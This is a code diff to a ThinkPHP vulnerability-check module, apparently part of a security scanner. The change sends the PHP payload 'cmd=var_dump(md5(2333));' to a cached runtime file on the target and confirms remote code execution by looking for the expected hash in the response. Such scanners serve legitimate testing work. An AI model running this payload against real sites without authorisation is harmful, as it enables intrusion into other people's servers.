@@ -86,7 +86,7 @@ class ThinkPHP():
         path2 = r"/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php"
         method = 'get'
         desc = '[sql]'
-        data = ''
+        data = 'cmd=var_dump(md5(2333));'
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
         #输出类
         output = Output(self.url, pocname)
@@ -96,8 +96,7 @@ class ThinkPHP():
             if self.vuln == 'False':
                 r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                 r = exprequest.get(self.url+path2, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
-                if r"200" == str(r.status_code):
-                    
+                if "f7e0b956540676a129760a3eae309294" in r.text:
                     return output.no_echo_success(method, desc)
                 else:
                     return output.fail()
@@ -997,43 +996,3 @@ def check(**kwargs):
                 thread_list.append(kwargs['pool'].submit(getattr(ExpThinkPHP, func)))
     #保存全局子线程列表
     GlobalVar.add_value('thread_list', thread_list)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
